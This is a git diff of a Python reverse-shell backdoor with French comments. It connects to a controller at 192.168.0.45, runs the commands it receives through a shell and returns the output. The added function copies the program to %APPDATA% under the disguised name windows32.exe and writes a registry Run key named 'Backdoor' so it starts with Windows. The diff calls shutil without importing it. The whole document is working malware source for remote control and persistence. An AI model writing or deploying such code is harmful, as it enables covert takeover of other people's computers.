@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import os
+import sys
 
 def reliable_send(data):
     print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
@@ -61,6 +62,16 @@ def shell():
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result.decode('utf-8'))
+
+def createBackdoorOnWindowsMachine():
+    # on cree le path du fichier pour qu'il soit cacher
+    location = os.environ["appdata"] + "\\windows32.exe"
+    if not os.path.exists(location):
+        #on copie le fichier dans un le dossier location pourqu'il soit imreperable, meme si l'autre est supprimer celui-ci restera
+        shutil.copyfile(sys.executable, location)
+        # on appelle une commande de l'invite de command windows
+        # cette commande permet d'ajouter au registry de demarrage windows pour les logiciels 32 bits
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("192.168.0.45", 54321))
